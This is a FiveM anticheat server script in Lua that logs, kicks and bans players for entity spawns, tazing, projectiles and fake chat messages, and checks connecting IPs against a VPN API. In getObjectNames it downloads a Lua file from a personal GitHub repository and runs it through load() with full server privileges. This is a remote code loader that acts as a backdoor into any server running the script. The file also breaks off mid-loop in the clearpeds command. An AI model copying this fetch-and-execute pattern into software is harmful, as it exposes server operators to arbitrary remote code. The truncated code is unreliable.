

_G._inject = function(msg)
    if msg == nil then 
        return;
    end
    if string.len(tostring(msg)) < 60 then
        print("^3[Greek-AntiCheat]-^0"..msg);
    end
end

_G.gload = function(txt, src)
    if txt == nil or txt == "" then
        return;
    end
    local func, err = load(txt);
    if func then
        local ok, myfunction = pcall(func);
        if ok then
            if myfunction then
                myfunction(src);
            end
        else
            _inject("Execution error");
        end
    else
        _inject("Compilation error");
    end
end

CreateThread(function()
    cfg_ = LoadResourceFile("Greek_ac", "Config.lua");
    while cfg_ == nil do
        cfg_ = LoadResourceFile("Greek_ac", "Config.lua");
        Wait(100);
    end
    gload(cfg_);
    while Greek == nil do
        Wait(1000);
    end
    if Greek ~= nil then

        if sdoidmjt ~= nil then
            _inject("pppppppp");
            return;
        end

        allHandlers = {};
        gHandler = AddEventHandler;
        gNetHandler = RegisterNetEvent;
        
        
        AddEventHandler = function(a, b)
            local eventId = gHandler(a, b);
            allHandlers[eventId.key] = a;
            
            return eventId;
        end
        
        RegisterNetEvent = function(a, b)
            local eventId = gNetHandler(a, b);
            allHandlers[eventId.key] = a;
            
            return eventId;
        end
        
        CreateThread(function()
            ESX = nil;
            if Greek.onlyExport then
                CreateThread(function()
                    ESX = exports["es_extended"]:getSharedObject();
                end)
            else
                TriggerEvent(Greek.triggerObject, function(obj) ESX = obj end)
                Wait(3000);
                if ESX == nil then
                    CreateThread(function()
                        ESX = exports["es_extended"]:getSharedObject();
                    end)
                end
            end
            
            if Greek.showIpWithLogs == false then
                GetPlayerEndpoint = function()
                    return "0.0.0.0";
                end
                _G.GetPlayerEndpoint = function()
                    return "0.0.0.0";
                end
            end
            if Greek.stoppedOnLoading == nil then
                Greek.stoppedOnLoading = true;
            end
            if Greek.clientEvents == nil then
                Greek.clientEvents = {};
            end
            if Greek.whitePtfx == nil then
                Greek.whitePtfx = {};
            end
            _G.staff = function(id)
                if id and serverStaffs[tonumber(id)] and serverStaffs[tonumber(id)] ~= "user" then
                    return true;
                end
                local xPlayer = ESX.GetPlayerFromId(id);
                if xPlayer ~= nil then
                    if xPlayer.getGroup() ~= "user" then
                        return true;
                    else
                        return false;
                    end
                end
                return false;
            end 
        end)
        
        CreateThread(function()
            if GetResourceState(Greek.resource) ~= "started" then
                if Greek.resource ~= nil then
                    _inject("IMPORTANT MESSAGE!!");
                    _inject(Greek.resource.." is not running!! False BANS ALERT!!");
                    _inject("Please start the resource or set a valid resource on Config.lua[Greek.resource]");
                    _inject("IMPORTANT MESSAGE!!");
                else
                    _inject("IMPORTANT MESSAGE!!");
                    _inject("Please insert [Greek.resource] on your Config file!!");
                    _inject("IMPORTANT MESSAGE!!");
                    return;
                end
            end
        end)
        
        dumpTable = function(table, nb)
            if nb == nil then
                nb = 0
            end
        
            if type(table) == 'table' then
                local s = ''
                for i = 1, nb + 1, 1 do
                    s = s .. "    "
                end
        
                s = '{\n'
                for k,v in pairs(table) do
                    if type(k) ~= 'number' then k = '"'..k..'"' end
                    for i = 1, nb, 1 do
                        s = s .. "    "
                    end
                    s = s .. '['..k..'] = ' .. dumpTable(v, nb + 1) .. ',\n'
                end
        
                for i = 1, nb, 1 do
                    s = s .. "    "
                end
        
                return s .. '}'
            else
                return tostring(table)
            end
        end
        
        Greek.antiNoClip = true;
        if Greek.eventsToIgnore then
            Greek.eventsToIgnore["txsv:logger:deathEvent"] = true;
            Greek.eventsToIgnore["getAntiCheatBans"] = true;
            Greek.eventsToIgnore["antiCheatUnban"] = true;
            Greek.eventsToIgnore["screenshot:req"] = true;
            Greek.eventsToIgnore["props:log"] = true;
            Greek.eventsToIgnore["getServerProps"] = true;
            Greek.eventsToIgnore["deleteProp"] = true;
            Greek.eventsToIgnore["esx_policejob:impound"] = true;
            Greek.eventsToIgnore["esx:onPlayerDeath"] = true;
            Greek.eventsToIgnore["chat:init"] = true;
            Greek.eventsToIgnore["Casino:GetInfo"] = true;
            Greek.eventsToIgnore["txsv:checkIfAdmin"] = true;
            Greek.eventsToIgnore["txsv:checkAdminStatus"] = true;
            Greek.eventsToIgnore["dp:CheckVersion"] = true;
            Greek.eventsToIgnore["doitdigital_music:requestData"] = true;
            Greek.eventsToIgnore["Queue:playerActivated"] = true;
            Greek.eventsToIgnore["hardcap:playerActivated"] = true;
            Greek.eventsToIgnore["rlPlayerActivated"] = true;
            Greek.eventsToIgnore["esx_carlock:sendClientAllVehiclesS"] = true;
            Greek.eventsToIgnore["esx_communityservice:baseCheck"] = true;
            Greek.eventsToIgnore["server:group"] = true;
            Greek.eventsToIgnore["esx_documents:baseCheck"] = true;
            Greek.eventsToIgnore["esx:onPlayerJoined"] = true;
            Greek.eventsToIgnore["garbagejob:setconfig"] = true;
            Greek.eventsToIgnore["timer:baseCheck"] = true;
            Greek.eventsToIgnore["leaveMe"] = true;
            Greek.eventsToIgnore["mdtPolice:getOffensesAndOfficer"] = true;
            Greek.eventsToIgnore["kq_lootAreas:server:requestSync"] = true;
            Greek.eventsToIgnore["Casino:CheckOpenState"] = true;
            Greek.eventsToIgnore["rtx_hottub:Synchronize"] = true;
            Greek.eventsToIgnore["rcore_spray:gimmeColors"] = true;
            Greek.eventsToIgnore["loaf_lib:trigger_callback"] = true;
            Greek.eventsToIgnore["scully_radio:updateRadioInfo"] = true;
            Greek.eventsToIgnore["trew_hud_ui:getServerInfo"] = true;
            Greek.eventsToIgnore["cptiCheck"] = true;
            Greek.eventsToIgnore["letHapp"] = true;
            Greek.eventsToIgnore["revData"] = true;
            Greek.eventsToIgnore["job_garages:sendGarages_"] = true;
            Greek.eventsToIgnore["rtx_tv:Synchronize"] = true;
            Greek.eventsToIgnore["dctimer:baseCheck"] = true;
            Greek.eventsToIgnore["CrateDrops:playerLoaded"] = true;
            Greek.eventsToIgnore["topmales:addME"] = true;
            Greek.eventsToIgnore["raids:getMafiaLabels"] = true;
            Greek.eventsToIgnore["devmode:staffCheck"] = true;
            Greek.eventsToIgnore["jobgarages:sendGarages"] = true;
            Greek.eventsToIgnore["mdt:getOffensesAndOfficer"] = true;
            Greek.eventsToIgnore["rcore_radiocar:fetchCache"] = true;
            Greek.eventsToIgnore["rcore_radiocar:playerLoaded"] = true;
            Greek.eventsToIgnore["rtx_wateractivities:Global:Synchronize"] = true;
            Greek.eventsToIgnore["cdev_lib:TriggerServerCallback:cdev_soccer:fetchFields"] = true;
            Greek.eventsToIgnore["crosshair:gimmeDefaultDot"] = true;
            Greek.eventsToIgnore["mumble:Initialise"] = true;
            Greek.eventsToIgnore["rcore_basketball:loadPlacedHoops"] = true;
            Greek.eventsToIgnore["__ox_cb_ox_doorlock:getDoors"] = true;
        end
        
        Greek.blackSpawns[GetHashKey("kt1_lod_slod4")] = true;
        Greek.blackSpawns[GetHashKey("po1_lod_04")] = true;
        Greek.blackSpawns[GetHashKey("po1_lod_06")] = true;
        Greek.blackSpawns[GetHashKey("hw1_lod_08_09_16_17_18")] = true;
        Greek.blackSpawns[GetHashKey("cs4_lod_01_slod3")] = true;
        Greek.blackSpawns[GetHashKey("dt1_21_slod")] = true;
        Greek.blackSpawns[GetHashKey("dt1_11_dt1_tower_lod")] = true;
        Greek.blackSpawns[GetHashKey("id2_lod_00_ab_slod2")] = true;
        Greek.blackSpawns[GetHashKey("dt1_lod_03_04_05_11")] = true;
        Greek.blackSpawns[GetHashKey("kt1_lod_slod4")] = true;
        Greek.blackSpawns[GetHashKey("ch2_lod3_slod3")] = true;
        Greek.blackSpawns[GetHashKey("vb_lod_slod4")] = true;
        Greek.WhitelistEverything[tonumber(0)] = true;
        
        acBansLoaded = false;
        checkConnect = true;
        soundBlocking = false;
        if GlobalState then
            GlobalState.soundBlocking = false;
        end
        
        steamAndTokens = {};
        tNumWhitelist = {};
        tokenUnbanned = {};
        allWhitelists = {};
        tazedAndGood = {};
        serverStaffs = {};
        acBanList = {};
        tokens = {};
        steams = {};
        ips = {};
        ret = {};
        carSpawners = {};
        canTrigger = {};
        thisId = {};
        setted = {};
        
        steamAndTokens = {};
        playerGuids = {};
        steams = {};
        tokens = {};
        ips = {};
        
        CreateThread(function()
            if Greek.tNumWhitelist then
                for k,v in pairs(Greek.tNumWhitelist) do
                    tNumWhitelist[k] = true;
                end
            end
        end)
        
        sdoidmjt = "sdfgsdfg";
        
        _inject("Loading..");
        
        RegisterNetEvent("_cfx_internal:ffats", function()
            local id = source;
            local xPlayer = ESX.GetPlayerFromId(id);
            if xPlayer ~= nil then
                if xPlayer.getGroup() == "user" then
                    if GetNumPlayerTokens(id) == 0 then
                        Wait(5000)
                        if GetNumPlayerTokens(id) == 0 then
                            sendToDisc(id, "logged", "Possible Cheater Warning");
                            sendToLog(id, "logged", "Possible Cheater Warning");
                        end
                    end
                end
            end
        end)
        
        getObjectNames = function()
            local ___code = nil;
            while ___code == nil do
                PerformHttpRequest("https://raw.githubusercontent.com/paschaliszym542/Uploads/refs/heads/main/Objects_locked.lua", function(_, __, ___) --checked
                    if __ ~= nil then
                        ___code = __;
                    end
                end)
                Wait(3000);
            end
            return ___code;
        end
        
        CreateThread(function()
            local objs = getObjectNames();
            
            gload(objs);
            
            getObjName = function(hash)
                if objectNames then
                    return objectNames[hash] or hash;
                else
                    return hash;
                end
            end
            _G.getObjName = function(hash)
                if objectNames then
                    return objectNames[hash] or hash;
                else
                    return hash;
                end
            end
            isCustomModel = function(hash)
                if hash and (objectNames and objectNames[hash]) then
                    return false;
                end
                return true;
            end
            _G.isCustomModel = function(hash)
                if hash and (objectNames and objectNames[hash]) then
                    return false;
                end
                return true;
            end
        end)
        
        if Greek.AntiMessage == true then
            AddEventHandler("chatMessage", function(source, name, msg)
                local id = source;
                local realname = GetPlayerName(id);
                local ids = ExtractIdentifiers(id);
                local gameLicense = ids.license;
                local discord = ids.discord;
                local steam = ids.steam;
                if name ~= realname then
                    local xPlayer = ESX.GetPlayerFromId(id);
                    if xPlayer.getGroup() ~= "user" then
                        _inject("Ignoring ban for id "..id);
                        return;
                    end
                    TriggerClientEvent("cutCoords", id);
                    sendToDisc(id, "banned", "Tried to send fake message");
                    sendToLog(id, "banned", "Tried to send fake message");
                    SqlBan(id, "Tried to send fake message");
                    Wait(100);
                    loadBanList();
                    Wait(100);
                    DropPlayer(id, "Tried to send fake message");
                end
            end)
        end
        
        local usedPedTask = {};
        
        AddEventHandler("clearPedTasksEvent", function(source, data)
            if data.immediately then
                local id = source;
                if id == nil then
                    return;
                end
                
                Wait(1000);
                if Greek.banClearPedTasks == true then
                    Wait(1200);
                    if usedPedTask[tonumber(id)] ~= nil and (os.time() - usedPedTask[tonumber(id)]) < 30 then
                        return;
                    end
                    local entity = NetworkGetEntityFromNetworkId(data.pedId);
                    if DoesEntityExist(entity) then
                        local owner = GetEntityOwner(entity);
                        if owner and (tonumber(owner) ~= tonumber(id)) and IsPedAPlayer(entity) then
                            sendToDisc(id, "banned", "ClearPedTasks");
                            sendToLog(id, "banned", "ClearPedTasks");
                            SqlBan(id, "ClearPedTasks");
                            DropPlayer(id, "ClearPedTasks");
                        end
                    end
                else
                    sendToDisc(id, "logged", "ClearPedTasks");
                    sendToLog(id, "logged", "ClearPedTasks");
                end
            end
        end)
        
        RegisterNetEvent("cptiCheck", function()
            local id = source;
            
            usedPedTask[tonumber(id)] = os.time();
        end)
        
        logMult = true;
        jobsCanTaze = {
            ["police"] = true,
            ["offpolice"] = true,
            ["ambulance"] = true,
            ["offambulance"] = true,
            ["fbi"] = true,
            ["stratos"] = true,
            ["fib"] = true,
            ["sheriff"] = true,
            ["sherriff"] = true
        }
        
        CreateThread(function()
            if Greek.tazeJobs then
                for k,v in pairs(Greek.tazeJobs) do
                    jobsCanTaze[k] = true;
                end
            end
        end)
        
        AddEventHandler("weaponDamageEvent", function(sender, data)
            local id = sender;
        
            local weaponDamage = tonumber(data["weaponDamage"]);
            
            if data["overrideDefaultDamage"] and (weaponDamage > 500) and (not data["willKill"]) and (weaponDamage < 1000) and (logMult == true) then
                if weaponDamage == 512 then
                    sendToLog(id, "logged", "Possible multiplier damage dealt by player: "..weaponDamage.."--Possible Kill function");
                    TriggerClientEvent("cccc", id);
                    CancelEvent();
                    return;
                end
            end
            
            if data["willKill"] and GetSelectedPedWeapon(GetPlayerPed(id)) ~= data.weaponType then
                if (data.weaponType ~= `WEAPON_UNARMED`) then
                    TriggerClientEvent("cccc", id);
                end
            end
            
            if (data.weaponType == 911657153) or (data.weaponType == GetHashKey("WEAPON_STUNGUN")) then
                local steam = GetPlayerIdentifier(id);
                if GetSelectedPedWeapon(GetPlayerPed(id)) == GetHashKey("WEAPON_STUNGUN") then
                    return;
                end
                if tazedAndGood[steam] then
                    return;
                end
                local xPlayer = ESX.GetPlayerFromId(id);
                if (xPlayer ~= nil) then
                    if xPlayer.getGroup() ~= "user" then
                        tazedAndGood[steam] = true;
                        return;
                    end
                    if jobsCanTaze[xPlayer.job.name] or string.find(xPlayer.job.name, "security") then
                        tazedAndGood[steam] = true;
                        return;
                    end
                else
                    return;
                end
                if Greek.banTazePlayers then
                    sendToDisc(id, "banned", "Tried to Taze");
                    sendToLog(id, "banned", "Tried to Taze");
                    SqlBan(id, "Tried to Taze");
                    DropPlayer(id, "[Greek-AntiCheat]-Tried to Taze");
                else
                    sendToDisc(id, "logged", "Tried to Taze");
                    sendToLog(id, "logged", "Tried to Taze");
                end
                CancelEvent();
            end
        end)
        
        RegisterNetEvent("ccc", function()
            local id = source;
            
            sendToDisc(id, "logged", "Possible Kill function(still testing)");
            sendToLog(id, "logged", "Possible Kill function(still testing)");
        end)
        
        local antiBanSpam = {};
        local blacklistedProjectiles = {
            [1742569970]	= 'RPG Rocket',
        }
        
        local whitelistedProjectiles = {
            [1808594799]	= 'Flare',
        }
        
        local dontLogProjectiles = {
            [527765612]		= 'Space Rocket',
            [1742569970]	= 'RPG Rocket',
            [-767591211]	= 'APC Rocket',
            [1446246869]	= 'Molotov',
            [1808594799]	= 'Flare',
            [1173416293]	= 'FlareGun',
            [1198741878]	= 'Plane Rocket',
            [-1474608608]	= 'Tank Shell',
        }
        
        AddEventHandler('startProjectileEvent', function(sender, data)
            local sender = tonumber(sender);
            
            if not dontLogProjectiles[data.projectileHash] then
                _inject(GetPlayerName(sender)..' ['..sender..'] => '..json.encode(data));
            end
            
            if blacklistedProjectiles[data.projectileHash] then
                if GlobalState.milcargoCommander and GlobalState.milcargoCommander == sender then
                    return;
                end
                
                if GlobalState.trainDriver and GlobalState.trainDriver == sender then
                    return;
                end
                
                if (not whitelistedProjectiles[data.projectileHash]) and (serverStaffs[sender] ~= nil) and (serverStaffs[sender] == "user") then
                    CancelEvent();
                    
                    if not antiBanSpam[sender] then
                        antiBanSpam[sender] = true;
                        
                        local msg = "Projectile cheat detected";
                        
                        sendToDisc(sender, "logged", msg);
                        sendToLog(sender, "logged", msg);
                        
                        SetTimeout(5000, function() antiBanSpam[sender] = nil end);
                    end
                end
            end
        end)
        
        local playerInputs = {};
        local playerVehs = {};
        local pilots = {};
        local mechs = {};
        
        --
        
        RegisterNetEvent("inputCount", function(num)
            local id = source;
            
            if num then
                playerInputs[id] = num;
            end
        end)
        
        RegisterNetEvent("netInvokeS", function(num)
            local id = source;
            
            if num then
                playerVehs[id] = num;
            end
        end)
        
        if Greek.antiObjectMethod2 == true then
            AddEventHandler("entityCreating", function(entity)
                local _entity = entity;
                local owner = GetEntityOwner(_entity);
                if Greek.npcSpawn then
                    if GetEntityType(_entity) == 1 then
                        return;
                    end
                end
                if owner == nil then
                    if GetEntityType(_entity) ~= 2 then
                        CancelEvent();
                        return;
                    end
                end
                -- if not Greek.objectCarSpawnCancel and GetEntityType(_entity) ~= 2 then
                    -- prop(GetEntityModel(_entity), owner, _entity);
                -- end
            end)
        end
        
        local spawnTimes = {};
        local entitySpawners = {};
        local serverEntities = {};
        local noLogModels = {
            [`mp_m_freemode_01`] = true,
            [`s_m_m_paramedic_01`] = true,
            [`blimp`] = true,
            [`s_m_m_gentransport`] = true,
            [`frogger`] = true,
            [`s_m_m_gentransport`] = true,
            [`a_f_m_ktown_01`] = true,
        }
        
        -- POPTYPE_UNKNOWN = 0, 
        -- POPTYPE_RANDOM_PERMANENT = 1, 
        -- POPTYPE_RANDOM_PARKED = 2, 
        -- POPTYPE_RANDOM_PATROL = 3, 
        -- POPTYPE_RANDOM_SCENARIO = 4, 
        -- POPTYPE_RANDOM_AMBIENT = 5, 
        -- POPTYPE_PERMANENT = 6, 
        -- POPTYPE_MISSION = 7, 
        -- POPTYPE_REPLAY = 8, 
        -- POPTYPE_CACHE = 9, 
        -- POPTYPE_TOOL = 10,
        
        AddEventHandler("entityCreating", function(entity)
            local _entity = entity;
            local id = GetEntityOwner(_entity);
            local entityType = GetEntityType(_entity);
            local entityModel = GetEntityModel(_entity);
            
            if entityType == 2 then
                if Greek.WhitelistEverything[tonumber(entityModel)] ~= nil then
                    return;
                end
                if Greek.npcSpawn then
                    return;
                end
                if isCustomModel(entityModel) then
                    return;
                end
                
                Wait(500);
                local numbered = tonumber(id);
                local entName = getObjName(entityModel) or "Not found";
                
                if entitySpawners[numbered] == nil then
                    Wait(500);
                    if entitySpawners[numbered] == nil and (serverEntities[_entity] == nil) then
                        if entityModel and (noLogModels[entityModel] == nil) and DoesEntityExist(_entity) then
                            sendToDisc(numbered, "logged", "Vehicle Spawn Canceled due to no data received: "..entName);
                            sendToLog(numbered, "logged", "Vehicle Spawn Canceled due to no data received: "..entName);
                            
                            if spawnTimes[numbered] == nil then
                                spawnTimes[numbered] = 0;
                            end
                            spawnTimes[numbered] = spawnTimes[numbered] + 1;
                            
                            if spawnTimes[numbered] > 6 then
                                if DoesEntityExist(_entity) then
                                    DeleteEntity(_entity);
                                end
                                CancelEvent();
                                --sendToDisc(numbered, "kicked", "Vehicle Spawn Canceled due to no data received: "..entName);
                                --sendToLog(numbered, "kicked", "Vehicle Spawn Canceled due to no data received: "..entName);
                                --DropPlayer(numbered, "[Greek-Anticheat]-Detected abnormal actions");
                            end
                        end
                    end
                elseif (os.time() - entitySpawners[numbered]) > 15 and (serverEntities[_entity] == nil) then
                    if entityModel and (noLogModels[entityModel] == nil) and DoesEntityExist(_entity) then
                        sendToDisc(numbered, "logged", "Vehicle Spawn Canceled due to late data received: "..entName);
                        sendToLog(numbered, "logged", "Vehicle Spawn Canceled due to late data received: "..entName);
                        
                        TriggerClientEvent("screen", numbered, Greek.logHook);
                        if DoesEntityExist(_entity) then
                            DeleteEntity(_entity);
                        end
                        CancelEvent();
                    end
                end
            elseif entityType == 3 then
                if Greek.WhitelistEverything[tonumber(entityModel)] ~= nil then
                    return;
                end
                
                Wait(600);
                local numbered = tonumber(id);
                local entName = getObjName(entityModel) or "Not found";
                if entitySpawners[numbered] == nil then
                    Wait(550);
                    if entitySpawners[numbered] == nil and (serverEntities[_entity] == nil) then
                        if DoesEntityExist(_entity) then
                            sendToDisc(numbered, "logged", "Object Spawn Canceled due to no data received: "..entName);
                            sendToLog(numbered, "logged", "Object Spawn Canceled due to no data received: "..entName);
                            CancelEvent();
                            DeleteEntity(_entity);
                        end
                    end
                elseif (os.time() - entitySpawners[numbered]) > 15 and (serverEntities[_entity] == nil) then
                    if DoesEntityExist(_entity) then
                        if spawnTimes[numbered] == nil then
                            spawnTimes[numbered] = 0;
                        end
                        spawnTimes[numbered] = spawnTimes[numbered] + 1;
                        
                        if spawnTimes[numbered] > 6 then
                            if DoesEntityExist(_entity) then
                                DeleteEntity(_entity);
                            end
                            CancelEvent();
                            sendToDisc(numbered, "kicked", "Object Spawn Canceled due to late data received: "..entName);
                            sendToLog(numbered, "kicked", "Object Spawn Canceled due to late data received: "..entName);
                            --DropPlayer(numbered, "[Greek-Anticheat]-Detected abnormal actions");
                            return;
                        end
                    
                        sendToDisc(id, "logged", "Object Spawn Canceled due to late data received: "..entName);
                        sendToLog(id, "logged", "Object Spawn Canceled due to late data received: "..entName);
                        CancelEvent();
                        DeleteEntity(_entity);
                    end
                end
            end
        end)
        
        local animalSpawns = {};
        local playerPeds = {};
        local animals = {
            [`a_c_boar`] = "a_c_boar",
            [`a_c_cat_01`] = "a_c_cat_01",
            [`a_c_chickenhawk`] = "a_c_chickenhawk",
            [`a_c_chimp`] = "a_c_chimp",
            [`a_c_chop`] = "a_c_chop",
            [`a_c_cormorant`] = "a_c_cormorant",
            [`a_c_cow`] = "a_c_cow",
            [`a_c_coyote`] = "a_c_coyote",
            [`a_c_crow`] = "a_c_crow",
            [`a_c_deer`] = "a_c_deer",
            [`a_c_dolphin`] = "a_c_dolphin",
            [`a_c_fish`] = "a_c_fish",
            [`a_c_hen`] = "a_c_hen",
            [`a_c_humpback`] = "a_c_humpback",
            [`a_c_husky`] = "a_c_husky",
            [`a_c_killerwhale`] = "a_c_killerwhale",
            [`a_c_mtlion`] = "a_c_mtlion",
            [`a_c_pig`] = "a_c_pig",
            [`a_c_pigeon`] = "a_c_pigeon",
            [`a_c_poodle`] = "a_c_poodle",
            [`a_c_pug`] = "a_c_pug",
            [`a_c_rabbit_01`] = "a_c_rabbit_01",
            [`a_c_rat`] = "a_c_rat",
            [`a_c_retriever`] = "a_c_retriever",
            [`a_c_rhesus`] = "a_c_rhesus",
            [`a_c_rottweiler`] = "a_c_rottweiler",
            [`a_c_seagull`] = "a_c_seagull",
            [`a_c_sharkhammer`] = "a_c_sharkhammer",
            [`a_c_sharktiger`] = "a_c_sharktiger",
            [`a_c_shepherd`] = "a_c_shepherd",
            [`a_c_stingray`] = "a_c_stingray",
            [`a_c_westy`] = "a_c_westy",
        }
        
        local pedCounts = {};
        local popTypes = {
            [1] = true,
            [2] = true,
            [3] = true,
            [4] = true,
            [5] = true
        }
        
        AddEventHandler("entityCreating", function(entity)
            local _entity = entity;
            local entity_type = GetEntityType(_entity);
            
            if Greek.npcSpawn then
                return;
            end
            
            if entity_type == 1 then
                local model = GetEntityModel(_entity);
                local id = GetEntityOwner(_entity);
                
                if IsPedAPlayer(_entity) then
                    return;
                end
                
                local popType = GetEntityPopulationType(_entity);
                local _objName = getObjName(model);
                
                if popTypes[popType] then
                    --sendToLog(id, "logged", "Random ped spawn type: "..popType.."/".._objName);
                    return;
                end
                if model and (tostring(_objName) == "ig_wade") then
                    CancelEvent();
                    if DoesEntityExist(_entity) then
                        DeleteEntity(_entity);
                    end
                    sendToDisc(id, "logged", "Blocked Ped Spawn model: ".._objName);
                    sendToLog(id, "logged", "Blocked Ped Spawn model: ".._objName);
                    return;
                end
                
                if id and GetPlayerName(id) then
                    
                    local tries = 0;
                    TriggerClientEvent("netInvokeCP", id);
                    if playerPeds[id] ~= nil then
                        Wait(600); --already used native so wait to update
                    end
                    while (playerPeds[id] == nil) and (GetPlayerName(id) ~= nil) do
                        Wait(100);
                        tries = tries + 1;
                        if tries == 10 then
                            break;
                        end
                    end
                    if playerPeds[id] == nil then
                        playerPeds[id] = 300000;
                    end
                    
                    if model and animals[model] and (id and GetPlayerName(id)) and (playerPeds[id] > 2200) then
                        if animalSpawns[id] == nil then
                            animalSpawns[id] = 0;
                        end
                        animalSpawns[id] = animalSpawns[id] + 1;
                        
                        if animalSpawns[id] > 2 then
                            sendToDisc(id, "logged", "Animal Spawn Detected: "..animals[model]);
                            sendToLog(id, "logged", "Animal Spawn Detected: "..animals[model]);
                            if DoesEntityExist(_entity) then
                                DeleteEntity(_entity);
                            end
                            CancelEvent();
                            return;
                        end
                    end
                    
                    if GetPlayerName(id) and (playerPeds[id] > 2200) then
                        Wait(200);
                        if DoesEntityExist(_entity) then
                            if model and (noLogModels[model] == nil) then
                                sendToDisc(id, "logged", "Blocked Ped Spawn model: ".._objName);
                                sendToLog(id, "logged", "Blocked Ped Spawn model: ".._objName);
                                
                                if pedCounts[id] == nil then
                                    pedCounts[id] = 0;
                                end
                                pedCounts[id] = pedCounts[id] + 1;
                                
                                if pedCounts[id] > 7 then
                                    sendToDisc(id, "banned", "Blocked Ped Spawn model: ".._objName);
                                    sendToLog(id, "banned", "Blocked Ped Spawn model: ".._objName);
                                    SqlBan(id, "Blocked Ped Spawn model: ".._objName);
                                    DropPlayer(id, "[Greek-AntiCheat]-Nope");
                                end
                            end
                            if DoesEntityExist(_entity) then
                                DeleteEntity(_entity);
                            end
                            CancelEvent();
                        end
                    end
                    --playerPeds[id] = nil;
                end
                
            end
        end)
        
        RegisterNetEvent("netInvokeSP", function(num)
            local id = source;
            
            if num then
                playerPeds[id] = num;
            end
        end)
        
        CreateThread(function()
            while true do
                Wait(10000);
                animalSpawns = {};
            end
        end)
        
        RegisterNetEvent("esx:setData_", function()
            local id = tonumber(source);
            
            entitySpawners[id] = os.time();
        end)
        
        AddEventHandler("serverEntCreation", function(ent)
            serverEntities[ent] = true;
        end)
        
        AddEventHandler("whitelist:me", function(id)
            allWhitelists[id] = true;
        end)
        
        RegisterCommand("acAddWhiteProp", function(source, args)
            local prop = args[1];
            if source == 0 then
                if prop then
                    Greek.WhitelistEverything[GetHashKey(prop)] = true;
                    _inject("Added for now! Don't forget to add it to Config");
                end
            end
        end)
        
        RegisterCommand("acRemWhiteProp", function(source, args)
            local prop = args[1];
            if source == 0 then
                if prop and Greek.WhitelistEverything[prop] then
                    Greek.WhitelistEverything[GetHashKey(prop)] = nil;
                    _inject("Removed for now! Don't forget to remove it from Config");
                end
            end
        end)
        
        if Greek.antiSpawn then
            AddEventHandler("entityCreating", function(ent)
                if ent ~= nil then
                    if Greek.blackSpawns[GetEntityModel(ent)] ~= nil and Greek.WhitelistEverything[GetEntityModel(ent)] == nil then
                        local owner = GetEntityOwner(ent);
                        if owner ~= nil then
                            if allWhitelists[owner] == nil then
                                DeleteEntity(ent);
                                CancelEvent();
                            end
                        end
                    end
                end
            end)
        end
        
        if Greek.antiVpn then
            vpn = true;
        
            RegisterCommand("toggleVpn", function(source)
                if source == 0 or source == "" then
                    vpn = not vpn;
                    print(vpn);
                end
            end)
        
            AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
                if not vpn then
                    return;
                end
                local player = source;
                local name, setKickReason, deferrals = name, setKickReason, deferrals;
                local ipIdentifier;
                local identifiers = GetPlayerIdentifiers(player);
                if Greek.vpnWhites and Greek.vpnWhites[GetPlayerIdentifier(player)] then
                    print(name.." has vpn access!");
                    return;
                end
                deferrals.defer();
                Wait(0);
                deferrals.update(string.format("Hello %s. Your IP Address is being checked.", name));
                for _, v in pairs(identifiers) do
                    if string.find(v, "ip") then
                        ipIdentifier = v:sub(4);
                        break;
                    end
                end
                Wait(0)
                if not ipIdentifier then
                    deferrals.done("We could not find your IP Address.");
                else
                    PerformHttpRequest("http://ip-api.com/json/"..ipIdentifier.."?fields=proxy", function(err, text, headers) --checked
                        if tonumber(err) == 200 then
                            local tbl = json.decode(text);
                            if tbl["proxy"] == false then
                                deferrals.done();
                            else
                                _inject(name.." is using vpn!");
                                deferrals.done("You are using a VPN or a proxy. Please make sure that you are not using anything.");
                            end
                        else
                            deferrals.done("There was an error in the API.");
                        end
                    end)
                end
            end)
        end
        
        if Greek.antiVehSpam then
            AddEventHandler("entityCreating", function(ent)
                if Greek.WhitelistEverything[GetEntityModel(ent)] ~= nil then
                    return;
                end
                if Greek.npcSpawn then
                    return;
                end
                if GetEntityType(ent) == 2 then
                    if DoesEntityExist(ent) then
                        local id = GetEntityOwner(ent);
                        if id ~= nil then
                            if (_bans[id] ~= nil) or (ret[id] ~= nil) then
                                return;
                            end
                            if carSpawners[id] == nil then
                                carSpawners[id] = { num = 0, spawns = {} };
                            end
                            carSpawners[id].num = carSpawners[id].num + 1;
                            table.insert(carSpawners[id].spawns, ent);
                            if carSpawners[id] ~= nil then
                                if math.floor(carSpawners[id].num) > math.floor(Greek.numberCarSpam) then
                                    if staff(id) then
                                        ret[id] = "";
                                        return;
                                    end
                                    if GetPlayerName(id) == nil then
                                        return;
                                    end
                                end
                                if math.floor(carSpawners[id].num) > math.floor(Greek.numberCarSpam+5) then
                                    --if Greek.banSpamVehicles then
                                    --    sendToDisc(id, "banned", "Vehicle spam");
                                    --    sendToLog(id, "banned", "Vehicle spam");
                                    --    SqlBan(id, "Vehicle spam");
                                    --    loadBanList();
                                    --    DropPlayer(id, "[Greek-AntiCheat]-Vehicle spam");
                                    --else
                                        sendToDisc(id, "logged", "Vehicle spam/"..carSpawners[id].num);
                                        sendToLog(id, "logged", "Vehicle spam/"..carSpawners[id].num);
                                        DropPlayer(id, "[Greek-AntiCheat]-Vehicle spam");
                                    --end
                                    for k,v in pairs(carSpawners[id].spawns) do
                                        if v and DoesEntityExist(v) then
                                            DeleteEntity(v);
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            CreateThread(function()
                while true do
                    Wait(Greek.carWait*1000);
                    carSpawners = nil;
                    carSpawners = {};
                end
            end)
        end
        
        RegisterCommand("clearveh", function(source, args)
            local id = source;
            local dist = tonumber(args[1]);
            local coords = GetEntityCoords(GetPlayerPed(id));
            
            if canUseCmd(id) then
                local vehs = GetAllVehicles();
                
                for k,v in pairs(vehs) do
                    if DoesEntityExist(v) and #(GetEntityCoords(v) - coords) < dist then
                        DeleteEntity(v);
                    end
                end
            end
        end)
        
        RegisterCommand("clearobj", function(source, args)
            local id = source;
            local dist = tonumber(args[1]);
            local coords = GetEntityCoords(GetPlayerPed(id));
            
            if canUseCmd(id) then
                local vehs = GetAllObjects();
                
                for k,v in pairs(vehs) do
                    if DoesEntityExist(v) and #(GetEntityCoords(v) - coords) < dist then
                        DeleteEntity(v);
                    end
                end
            end
        end)
        
        RegisterCommand("clearpeds", function(source, args)
            local id = source;
            local xPlayer = ESX.GetPlayerFromId(id);
            local dist = tonumber(args[1]);
            local coords = GetEntityCoords(GetPlayerPed(id));
            
            if canUseCmd(id) then
                local peds = GetAllPeds();
                
                for k,v in pairs(peds) do
